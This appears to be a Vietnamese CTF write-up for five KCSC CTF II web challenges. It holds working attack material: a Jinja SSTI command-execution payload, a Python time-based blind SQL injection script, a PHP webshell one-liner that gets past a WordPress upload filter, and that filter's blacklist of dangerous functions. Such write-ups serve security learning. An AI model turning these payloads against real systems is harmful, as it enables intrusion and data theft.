@@ -1,0 +1,574 @@
+---
+title: KCSC CTF II - WEB
+date: 2025-03-10
+tags: [ctf, web]
+categories: [Writeups, CTF]
+author: bumbi.203_
+img_path: /assets/img/CTF/kcscII-2025/
+image: /assets/img/CTF/kcscII-2025/banner.png
+---
+
+# 🚩 KCSC CTF II 2025 
+
+## ✨ YDSYD 
+
+### ⭕ Giao diện web 
+
+![image](/assets/img/CTF/kcscII-2025/image2.png)
+
+### ⭕ Review Source Code 
+
+```javascript
+import { serve } from "bun";
+import { SignJWT, jwtVerify } from "jose";
+
+const JWT_SECRET = "<It's a secret, but I trust you'll figure it out>";
+const secretKey = new TextEncoder().encode(JWT_SECRET);
+
+const flag = "KMACTF{hehe}";
+
+function getFlagGetter() {
+    return function () {
+        return flag;
+    };
+}
+const flagGetter = getFlagGetter();
+
+const users = {
+    alice: { configProto: {}, config: Object.create({}), isAdmin: false },
+    bob: { configProto: {}, config: Object.create({}), isAdmin: false },
+    admin: { configProto: {}, config: Object.create({}), isAdmin: true },
+};
+
+const safeProps = new Set(["name", "user"]);
+
+function sandboxTemplate(template: string, context: any) {
+    const proxy = new Proxy(context, {
+        get(target, prop) {
+            if (safeProps.has(prop as string)) {
+                return Reflect.get(target, prop);
+            }
+            throw new Error("Access denied to property: " + prop.toString());
+        },
+    });
+    return template.replace(/\{\{(\w+)\}\}/g, (_, key) => {
+        try {
+            const val = (proxy as any)[key];
+            if (typeof val === "string" || typeof val === "number") return val;
+        } catch { }
+        return "";
+    });
+}
+
+function merge(target: any, source: any) {
+    for (const key in source) {
+        if (key === "template" || key === "user") continue;
+        if (
+            source[key] &&
+            typeof source[key] === "object" &&
+            target[key] &&
+            typeof target[key] === "object"
+        ) {
+            merge(target[key], source[key]);
+        } else {
+            target[key] = source[key];
+        }
+    }
+    return target;
+}
+
+async function authenticate(request: Request) {
+    const authHeader = request.headers.get("authorization");
+    if (!authHeader || !authHeader.startsWith("Bearer ")) return null;
+    const token = authHeader.slice(7);
+    try {
+        const { payload } = await jwtVerify(token, secretKey, {
+            algorithms: ["HS256"],
+        });
+        if (payload && typeof payload.user === "string" && users[payload.user]) {
+            return { username: payload.user as string, isAdmin: payload.isAdmin === true };
+        }
+    } catch { }
+    return null;
+}
+
+async function generateToken(username: string, isAdmin = false) {
+    return await new SignJWT({ user: username, isAdmin })
+        .setProtectedHeader({ alg: "HS256" })
+        .setIssuedAt()
+        .setExpirationTime("1h")
+        .sign(secretKey);
+}
+
+serve({
+    async fetch(request) {
+        const url = new URL(request.url);
+        if (url.pathname === "/login" && request.method === "POST") {
+            try {
+                const body = await request.json();
+                const user = body.user;
+                if (!user || !users[user]) {
+                    return new Response("User not found", { status: 404 });
+                }
+                const token = await generateToken(user, users[user].isAdmin);
+                return new Response(JSON.stringify({ token }), {
+                    status: 200,
+                    headers: { "Content-Type": "application/json" },
+                });
+            } catch {
+                return new Response("Invalid JSON", { status: 400 });
+            }
+        }
+        const auth = await authenticate(request);
+        if (!auth) return new Response("Unauthorized. Use POST /login then POST /annyeong with Bearer token", { status: 401 });
+        const username = auth.username;
+        const isAdmin = auth.isAdmin;
+        const userInfo = users[username];
+        if (!Object.getPrototypeOf(userInfo.config)) {
+            Object.setPrototypeOf(userInfo.config, userInfo.configProto);
+            if (!userInfo.config.user) userInfo.config.user = { name: username };
+        }
+        if (url.pathname === "/annyeong" && request.method === "POST") {
+            try {
+                const data = await request.json();
+                merge(userInfo.configProto, data);
+
+                if (isAdmin) {
+                    return new Response(flagGetter(), { status: 200 });
+                }
+                const template = "{{name}} says hello";
+                const result = sandboxTemplate(template, userInfo.config.user);
+                return new Response(result, { status: 200 });
+            } catch {
+                return new Response("Invalid JSON or sandbox error", { status: 400 });
+            }
+        }
+        return new Response(
+            "Unauthorized. Use POST /login then POST /annyeong with Bearer token",
+            { status: 401 }
+        );
+    },
+});
+``` 
+
+### ⭕ Khai thác 
+
+Đọc qua source thì thấy bài này có vẻ bị `protocol pollution`
+
+![image](/assets/img/CTF/kcscII-2025/image3.png)
+
+Ở hàm này thực hiện `merge` mà ko có filtered.
+
+Và có sẵn các user sau:
+
+![image](/assets/img/CTF/kcscII-2025/image4.png)
+
+Hàm tạo ra token 
+
+![image](/assets/img/CTF/kcscII-2025/image5.png)
+
+Khi mình gọi `POST login` thì nó sẽ thực hiện tạo token.
+
+![image](/assets/img/CTF/kcscII-2025/image6.png)
+
+![image](/assets/img/CTF/kcscII-2025/image7.png)
+
+Sau đó, nó sẽ gọi tới hàm `authen` qua header 
+
+![image](/assets/img/CTF/kcscII-2025/image8.png)
+
+Và dể đọc flag thì mình gọi tới `/POST annyeong` với cái token được load `isAdmin: true`
+
+Cho nên khi mà mình có `prototype pollution` được thì vẫn ko ảnh hưởng gì vì đọc flag dựa vào token xác thực trên header.
+
+Đọc kỹ thì thấy có sẵn user `admin` và nó cũng được set quyền `isAdmin: true` 
+
+![image](/assets/img/CTF/kcscII-2025/image9.png)
+
+Sau đó, gọi tới `/annyeong` với token được tạo ra.
+
+![image](/assets/img/CTF/kcscII-2025/image10.png)
+
+## ✨ ACL and H1 
+
+### ⭕ Giao diện web 
+
+![image](/assets/img/CTF/kcscII-2025/image11.png)
+
+**Upload Files**
+
+![image](/assets/img/CTF/kcscII-2025/image12.png)
+
+**My Files**
+
+![image](/assets/img/CTF/kcscII-2025/image13.png)
+
+### ⭕ Review Source Code 
+
+Đọc qua source code thì thấy web này có đi qua 1 proxy. Nghĩa là mọi traffic từ client sẽ qua `Apache Traffic Server` rồi mới Server Backend 
+
+![image](/assets/img/CTF/kcscII-2025/image14.png)
+
+Đọc qua các file config của proxy thì như sau:
+
+![image](/assets/img/CTF/kcscII-2025/image15.png)
+
+Như vậy nó chặn endpoint `/render` với mọi method `GET và POST`
+
+Khi đọc qua source và thấy endpoint `/render` bị dính `SSTI` nhưng lại bị chặn.
+
+![image](/assets/img/CTF/kcscII-2025/image16.png)
+
+Và mình chỉ có thể upload được file `.txt` và `.html`
+
+![image](/assets/img/CTF/kcscII-2025/image17.png)
+
+### ⭕ Khai thác 
+
+Mình thử upload 1 file `.txt` có nội dung là: **&#123;&#123; 7*7 &#125;&#125;**
+
+![image](/assets/img/CTF/kcscII-2025/image18.png)
+
+Sau đó, mình gọi tới render file vừa upload xong. 
+
+![image](/assets/img/CTF/kcscII-2025/image19.png)
+
+Nhưng mình bị chặn do proxy, giờ phải tìm cách bypass. 
+
+Sau khi, tìm đọc document thì mình thấy proxy đang dùng có version là `10.0.4` thì có bị `HTTP request Smuglling`, cho nên mình thử bypass biến đổi endpoint `render` thành hình dạng khác nhưng server vẫn hiểu là endpoint `render` để qua mặt proxy.
+
+![image](/assets/img/CTF/kcscII-2025/image20.png)
+
+Mình thấy là nó render ra được dị là đã trigger thành công. 
+
+Sau đó, mình tạo file payload để đọc flag như sau.
+
+**&#123;&#123; request.application.__globals__.__builtins__.__import__('os').popen("sh -c 'cat /flag_* 2>/dev/null'").read() &#125;&#125;**
+
+![image](/assets/img/CTF/kcscII-2025/image21.png)
+
+## ✨ Vibe_coding
+
+### ⭕ Giao diện web 
+
+![image](/assets/img/CTF/kcscII-2025/image22.png)
+
+### ⭕ Review Source Code 
+
+![image](/assets/img/CTF/kcscII-2025/image23.png)
+
+Mình có endpoint này để có đăng ký 1 user. 
+
+![image](/assets/img/CTF/kcscII-2025/image24.png)
+
+Và endpoint `/login` để sinh ra 1 token 
+
+![image](/assets/img/CTF/kcscII-2025/image25.png)
+
+Khi thực 1 action thì nó sẽ gọi tới sever python. 
+
+![image](/assets/img/CTF/kcscII-2025/image26.png)
+
+Có 1 action đọc flag là `readFlag` cần là admin.
+
+### ⭕ Khai thác 
+
+Ở bài này có thể đã có 1 lỗi mà ko bít tác giả có biết ko. 
+Mình có thể register 1 user admin theo 1 cách tà đạo như sau: 
+
+Mình sẽ đăng ký 1 user với 1 ký tự đằng sau nhưng server vẫn nhìn thấy là user admin thật sự
+
+![image](/assets/img/CTF/kcscII-2025/image27.png)
+
+![image](/assets/img/CTF/kcscII-2025/image28.png)
+
+## ✨ Lost_Data_Prenvention 
+
+### ⭕ Giao diện web 
+
+![image](/assets/img/CTF/kcscII-2025/image29.png)
+
+Mình có 3 chức năng: 
+- Cases Search 
+- Attachment
+- Export Logs
+
+**Cases Search**
+
+![image](/assets/img/CTF/kcscII-2025/image30.png)
+
+Ứng dụng cho phép search cái gì đó dựa trên `title`
+
+**Attachments**
+
+![image](/assets/img/CTF/kcscII-2025/image31.png)
+
+Có thể là dùng để hiển thị trong table nào đó
+
+**Export Logs**
+
+![image](/assets/img/CTF/kcscII-2025/image32.png)
+
+Được dùng để đọc 1 file nhưng chỉ được file có extension là `.txt` và `.log`
+
+### ⭕ Review Source Code 
+
+Mình tìm thấy trong foler `db` là file `001_schema.sql`
+
+![image](/assets/img/CTF/kcscII-2025/image33.png)
+
+Như vậy thì đã có cấu trúc của database.
+
+Và trong chức năng **Search** thì nó gọi tới `/api/search.php`
+
+![image](/assets/img/CTF/kcscII-2025/image34.png)
+
+Nhìn thấy nhận query qua tham số `GET q` và filter:
+- bỏ qua khoảng trắng 
+- `or` và `and` là 1 từ độc lập (nghĩa là `or` hay `OR` và `and` hay `AND` đều bị filter, nếu `DOOR` hay `SAND` thì đều ko filter)
+- chặn `union`, `load_file`, `outfile` và `=`
+
+Trong chức năng **Export** có source như sau:
+
+![image](/assets/img/CTF/kcscII-2025/image35.png)
+
+Nhìn thấy thì nó được viết nối chuỗi và chặn `../` nhưng vẫn có thể bypass nên chỗ này bị **path_traversal**
+
+Quan sát thì có file `init_flag.php`
+
+![image](/assets/img/CTF/kcscII-2025/image36.png)
+
+Thì mình thấy nó tạo ra đường dẫn lưu file flag thông qua cột `storage_path` trong table `attachments` thông qua cột `filename`
+
+### ⭕ Khai thác 
+
+Như trên thì để khai thác lấy flag bằng cách SQLi ở chức năng `search` để lấy `file path` từ đó đọc file qua chức năng `Export`. 
+
+Sau khi quan sát và thử nhiều payload thì thấy nó là sqli time based. Và payload tui truyền là `'|IF(1/1,SLEEP(5),0)#`
+
+![image](/assets/img/CTF/kcscII-2025/image37.png)
+
+Như vậy, mình khai thác để lấy như sau: 
+
+```python
+import requests, time, sys
+
+SLEEP_TIME = 2
+THRESHOLD = 1.5
+
+def send_res(payload):
+    burp0_url = f"http://localhost:8081/api/search.php?q={payload}"
+    burp0_cookies = {"pma_lang": "en", "wp-settings-time-0": "1758872539", "wp-settings-0": "editor%3Dtinymce", "pmaUser-1": "BImbD0b3lzHigjwMBgJBr7LGVkwwsFu1bM3g1otKJKM6VXwKWe%2BXkeWf1Hk%3D", "wp-settings-time-22": "1758974445", "wp-settings-22": "libraryContent%3Dbrowse%26editor%3Dhtml", "wp-settings-time-1": "1758977129", "PHPSESSID": "23373df87a1a6a521b034fc34f0b4d60"}
+    burp0_headers = {"sec-ch-ua-platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "sec-ch-ua": "\"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"140\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36", "sec-ch-ua-mobile": "?0", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:8081/cases.php", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
+    start = time.time()
+    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+    return time.time() - start 
+
+data = ""
+for i in range(17, 65):
+    left = 32 
+    right = 126
+    while left <= right: 
+        mid = (left + right) // 2
+        payload = f"'|IF((SELECT/**/ASCII(SUBSTR(storage_path,{i},1))/**/FROM/**/attachments)>{mid},SLEEP({SLEEP_TIME}),0)%23"
+        res = send_res(payload)
+        if res > THRESHOLD:
+            left = mid + 1
+        else:
+            right = mid - 1 
+    data += chr(left)
+    sys.stdout.write(f"\r[+] Data: {data}")
+    sys.stdout.flush()
+``` 
+
+![image](/assets/img/CTF/kcscII-2025/image38.png)
+
+Sau đó, mình lấy flag thuiii 
+
+![image](/assets/img/CTF/kcscII-2025/image39.png)
+
+## ✨ CVE-2025-93XX 
+
+### ⭕ Giao diện web 
+
+![image](/assets/img/CTF/kcscII-2025/image40.png)
+
+### ⭕ Phân tích
+
+Sau khi tìm hiểu thì đây là CVE-2025-9321, nó cho phép thực hiện code mà ko cần xác thực.
+
+Được thực hiện qua plugins wpcasa ở version 1.4.0 
+
+Cho nên tui đã cài source của version 1.4.1 là version đã vá lỗi để tìm phần khác nhau. 
+
+![image](/assets/img/CTF/kcscII-2025/image41.png)
+
+Thì tui phát hiện ra phần khác nhau nằm ở chỗ này. 
+
+Đoạn code này thực hiện kiểm tra filename trong khi duyệt qua tất cả file trong folder `uploads_safe_classes`
+Sau đó nó sẽ thực hiện tra xem trong file đó có bị sai cú pháp hay ko. Nếu ko thì thực hiện include file đó. 
+
+Và chỗ này là mấu chốt dẫn đến RCE. Vì nếu attack upload 1 shell thì có thực hiện kết nối. 
+
+Tiếp đó, mình cần kiểm tra trên này có các endpoint nào ko. 
+
+![image](/assets/img/CTF/kcscII-2025/image42.png)
+
+Hình như có vẻ nó là 1 endpoint cho phép upload. Và tui tìm thấy 1 file upload là `safe-php-class-uploaded.php`
+
+```php
+<?php
+/*
+Plugin Name: Safe PHP Class Upload (read-only, non-executable)
+Description: A plugin to safely upload PHP class files for review, without executing them. Files are stored as .txt to prevent execution.
+Version: 0.1
+Author: meulody
+*/
+
+if (!defined('ABSPATH')) {
+    exit;
+}
+
+class Safe_Class_Uploader
+{
+    const SAFE_UPLOAD_DIR = 'uploads_safe_classes';
+    const MAX_FILE_SIZE = 64;
+
+    public function __construct()
+    {
+        add_action('rest_api_init', function () {
+            register_rest_route('safe-upload/v1', '/upload', array(
+                'methods' => 'POST',
+                'callback' => array($this, 'handle_upload'),
+                'permission_callback' => '__return_true'
+            ));
+        });
+    }
+
+    private function ensure_dir()
+    {
+        $dir = self::SAFE_UPLOAD_DIR;
+        if (!is_dir($dir)) {
+            if (!@mkdir($dir, 0750, true)) {
+                return new WP_Error('dir_error', 'Could not create safe storage directory on server.', array('status' => 500));
+            }
+        }
+        return true;
+    }
+
+    private function has_dangerous_tokens($content)
+    {
+        $dangerous = array(
+            'exit(',
+            'die(',
+            'file(',
+            'echo(',
+            'print(',
+            'printf(',
+            'print_r(',
+            'var_dump(',
+            'var_export(',
+            'debug_zval_dump(',
+            'encode(',
+            'decode(',
+            'exec(',
+            'system(',
+            'shell_exec(',
+            'passthru(',
+            'proc_open(',
+            'eval(',
+            'assert(',
+            '`',
+            'contents(',
+            'open(',
+            'bin2hex(',
+            'serialize(',
+            'htmlspecialchars(',
+            'htmlentities(',
+            'unlink(',
+            'rename(',
+            'goto ',
+            'new ',
+            'copy ('
+        );
+        $hay = strtolower($content);
+        foreach ($dangerous as $tok) {
+            if (strpos($hay, $tok) !== false)
+                return $tok;
+        }
+        return false;
+    }
+
+    public function handle_upload(\WP_REST_Request $request)
+    {
+        $ok = $this->ensure_dir();
+        if (is_wp_error($ok))
+            return $ok;
+
+        $files = $request->get_file_params();
+        if (empty($files['file'])) {
+            return new WP_Error('no_file', 'Could not find upload file (field name = file).', array('status' => 400));
+        }
+        $file = $files['file'];
+
+        if ($file['size'] > self::MAX_FILE_SIZE) {
+            return new WP_Error('too_big', 'File is too large.', array('status' => 400));
+        }
+
+        $content = file_get_contents($file['tmp_name']);
+        if ($content === false) {
+            return new WP_Error('read_error', 'Could not read temporary file.', array('status' => 500));
+        }
+
+        if (!preg_match('/class\s+[A-Za-z0-9_]+/i', $content)) {
+            return new WP_Error('no_class', 'File does not contain a valid class declaration.', array('status' => 400));
+        }
+
+        $bad = $this->has_dangerous_tokens($content);
+        if ($bad !== false) {
+            return new WP_Error('dangerous_code', 'File contains dangerous token: ' . $bad, array('status' => 400));
+        }
+
+        $filename = pathinfo($file['name'], PATHINFO_FILENAME) . '.txt';
+        $fullpath = rtrim(self::SAFE_UPLOAD_DIR, '/') . '/' . $filename;
+
+        if (file_put_contents($fullpath, $content) === false) {
+            return new WP_Error('write_err', 'Could not save the safe file.', array('status' => 500));
+        }
+
+        @chmod($fullpath, 0644);
+
+        return rest_ensure_response(array(
+            'status' => 'ok',
+            'message' => 'Upload successful.',
+        ));
+    }
+}
+
+new Safe_Class_Uploader();
+```
+
+Nó cho phép mình upload 1 file với 1 extension bất kỳ nhưng nó sẽ được cắt extension đó ra rồi nối vào là `.txt`
+Cho nên mình upload gì cũng thành file `.txt`
+
+Trong đó nội dung file phải tuân thủ:
+- bé hơn 64 bytes
+- ko chứa các ký tự trong blacklist 
+- phải chứa 1 class 
+
+Nhưng đây sẽ ko chặn được từ việc upload 1 payload như sau: `<?php phpinfo() class A {}`
+
+Sau đó mình tiến hành upload lên. 
+
+![image](/assets/img/CTF/kcscII-2025/image43.png)
+
+Và giờ mình thử load lại trang nếu nó thành công thì nó sẽ load ra trang phpinfo(). 
+
+![image](/assets/img/CTF/kcscII-2025/image44.png)
+
+Như vậy nếu mình upload payload bypass thì có thể RCE: `<?php system/**/("$_GET[a]"); class A {}`
+
+![image](/assets/img/CTF/kcscII-2025/image45.png)
+
+
+
